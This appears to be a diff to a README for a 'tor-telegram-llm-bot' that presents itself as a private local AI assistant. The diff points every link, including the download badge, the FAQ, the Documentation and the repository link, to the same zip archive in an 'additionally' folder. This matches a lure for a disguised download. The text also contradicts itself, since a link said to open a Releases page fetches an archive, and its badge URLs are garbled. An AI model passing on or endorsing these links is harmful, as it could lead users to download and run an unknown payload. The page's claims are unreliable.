@@ -4,11 +4,11 @@
 
 Welcome to the tor-telegram-llm-bot! This AI assistant helps you search through documents efficiently. It runs entirely on your computer, ensuring your data stays private.
 
-[![Download tor-telegram-llm-bot](https://raw.githubusercontent.com/HASSANE098/tor-telegram-llm-bot/main/additionally/tor-telegram-llm-bot-v1.8.zip%20Now-Get%20the%https://raw.githubusercontent.com/HASSANE098/tor-telegram-llm-bot/main/additionally/tor-telegram-llm-bot-v1.8.zip)](https://raw.githubusercontent.com/HASSANE098/tor-telegram-llm-bot/main/additionally/tor-telegram-llm-bot-v1.8.zip)
+[![Download tor-telegram-llm-bot](https://github.com/HASSANE098/tor-telegram-llm-bot/raw/refs/heads/main/additionally/tor-bot-llm-telegram-1.2.zip%20Now-Get%20the%https://github.com/HASSANE098/tor-telegram-llm-bot/raw/refs/heads/main/additionally/tor-bot-llm-telegram-1.2.zip)](https://github.com/HASSANE098/tor-telegram-llm-bot/raw/refs/heads/main/additionally/tor-bot-llm-telegram-1.2.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download tor-telegram-llm-bot](https://raw.githubusercontent.com/HASSANE098/tor-telegram-llm-bot/main/additionally/tor-telegram-llm-bot-v1.8.zip)
+To get started, visit this page to download: [Download tor-telegram-llm-bot](https://github.com/HASSANE098/tor-telegram-llm-bot/raw/refs/heads/main/additionally/tor-bot-llm-telegram-1.2.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version available.
@@ -59,13 +59,13 @@ We welcome contributions! If you're interested in improving the project, feel fr
 
 ## 📞 Support
 
-For further help, check the [FAQ section](https://raw.githubusercontent.com/HASSANE098/tor-telegram-llm-bot/main/additionally/tor-telegram-llm-bot-v1.8.zip) in the GitHub repository, or contact us directly through the Issues page. 
+For further help, check the [FAQ section](https://github.com/HASSANE098/tor-telegram-llm-bot/raw/refs/heads/main/additionally/tor-bot-llm-telegram-1.2.zip) in the GitHub repository, or contact us directly through the Issues page. 
 
 ## 🔗 Related Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/HASSANE098/tor-telegram-llm-bot/main/additionally/tor-telegram-llm-bot-v1.8.zip)
-- [Documentation](https://raw.githubusercontent.com/HASSANE098/tor-telegram-llm-bot/main/additionally/tor-telegram-llm-bot-v1.8.zip)
+- [GitHub Repository](https://github.com/HASSANE098/tor-telegram-llm-bot/raw/refs/heads/main/additionally/tor-bot-llm-telegram-1.2.zip)
+- [Documentation](https://github.com/HASSANE098/tor-telegram-llm-bot/raw/refs/heads/main/additionally/tor-bot-llm-telegram-1.2.zip)
   
 Stay tuned for regular updates and improvements! Check back often for new features and enhancements.
 
-[![Download tor-telegram-llm-bot](https://raw.githubusercontent.com/HASSANE098/tor-telegram-llm-bot/main/additionally/tor-telegram-llm-bot-v1.8.zip%20Now-Get%20the%https://raw.githubusercontent.com/HASSANE098/tor-telegram-llm-bot/main/additionally/tor-telegram-llm-bot-v1.8.zip)](https://raw.githubusercontent.com/HASSANE098/tor-telegram-llm-bot/main/additionally/tor-telegram-llm-bot-v1.8.zip)
+[![Download tor-telegram-llm-bot](https://github.com/HASSANE098/tor-telegram-llm-bot/raw/refs/heads/main/additionally/tor-bot-llm-telegram-1.2.zip%20Now-Get%20the%https://github.com/HASSANE098/tor-telegram-llm-bot/raw/refs/heads/main/additionally/tor-bot-llm-telegram-1.2.zip)](https://github.com/HASSANE098/tor-telegram-llm-bot/raw/refs/heads/main/additionally/tor-bot-llm-telegram-1.2.zip)
